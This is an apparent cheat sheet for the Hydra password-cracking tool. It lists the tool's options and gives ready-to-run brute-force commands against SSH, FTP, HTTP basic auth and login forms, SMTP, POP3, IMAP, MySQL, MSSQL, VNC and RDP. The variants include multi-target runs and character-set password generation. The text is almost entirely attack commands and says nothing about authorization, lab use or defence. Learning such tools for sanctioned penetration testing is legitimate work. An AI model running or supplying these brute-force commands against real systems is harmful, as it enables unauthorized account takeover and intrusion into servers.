Basic Syntax
      hydra [login options] [password options] [attack options] [service]

| Option | Meaning                  | Example        |
| ------ | ------------------------ | -------------- |
| -l     | Single username          | -l admin       |
| -L     | Username list file       | -L users.txt   |
| -p     | Single password          | -p 1234        |
| -P     | Password list file       | -P rockyou.txt |
| -t     | Number of threads        | -t 4           |
| -f     | Stop after first success | -f             |
| -s     | Custom port              | -s 2222        |
| -v     | Verbose output           | -v             |
| -V     | More detailed output     | -V             |

Target Format
      service://IP
Example:
      ssh://192.168.1.100

Common Services

| Service        | Description              |
| -------------- | ------------------------ |
| ftp            | File transfer login      |
| ssh            | Remote login             |
| http-get       | Basic web authentication |
| http-post-form | Login forms              |
| smtp           | Email sending            |
| pop3           | Email receiving          |
| mysql          | Database login           |
| rdp            | Windows remote login     |


1.SSH Brute Force
      hydra -l root -P passwords.txt ssh://192.168.1.100
Explanation:
Username = root
Password list = passwords.txt
Target = SSH service

1.2 FTP Brute Force
    hydra -l admin -P passwords.txt ftp://192.168.1.100

1.3 HTTP Basic Authentication
    hydra -L usernames.txt -P passwords.txt example.com http-get

1.4 HTTP Login Form (Important)
    hydra -l admin -P passwords.txt example.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

Explanation:
Part	Meaning
/login	Login page
user=^USER^	Username parameter
pass=^PASS^	Password parameter
F=incorrect	Failure message

1.5 FTP on Custom Port
      hydra -L users.txt -P passwords.txt -s 2121 -V ftp.example.com ftp

1.6 Multiple Targets
      hydra -l root -p toor -M targets.txt ssh
Explanation:
-M allows multiple IPs from a file

1.7 RDP Brute Force (Advanced)
      hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp

Explanation:
Password length: 6 to 8
Character set: a-z, A-Z, 0-9


| Hydra Service             | Protocol                         | Description (Simple)                             | Example Command (with IP)                                                                                   |
| ------------------------- | -------------------------------- | ------------------------------------------------ | ----------------------------------------------------------------------------------------------------------- |
| ftp                       | File Transfer Protocol           | Used to attack FTP login (file transfer service) | `hydra -l admin -P passwords.txt ftp://192.168.1.100`                                                       |
| ssh                       | Secure Shell                     | Used to attack remote login (Linux servers)      | `hydra -l root -P passwords.txt ssh://192.168.1.100`                                                        |
| http-get / http-post-form | HTTP Web                         | Used to attack website login forms               | `hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"` |
| smtp                      | Simple Mail Transfer Protocol    | Used to attack email sending server login        | `hydra -l admin -P passwords.txt smtp://192.168.1.100`                                                      |
| pop3                      | Post Office Protocol             | Used to attack email inbox login                 | `hydra -l user -P passwords.txt pop3://192.168.1.100`                                                       |
| imap                      | Internet Message Access Protocol | Used to access email remotely                    | `hydra -l user -P passwords.txt imap://192.168.1.100`                                                       |
| mysql                     | MySQL Database                   | Used to attack database login                    | `hydra -l root -P passwords.txt mysql://192.168.1.100`                                                      |
| mssql                     | Microsoft SQL Server             | Used to attack MS SQL database                   | `hydra -l sa -P passwords.txt mssql://192.168.1.100`                                                        |
| vnc                       | Virtual Network Computing        | Used for remote desktop access                   | `hydra -P passwords.txt vnc://192.168.1.100`                                                                |
| rdp                       | Remote Desktop Protocol          | Used for Windows remote login                    | `hydra -l admin -P passwords.txt rdp://192.168.1.100`                                                       |

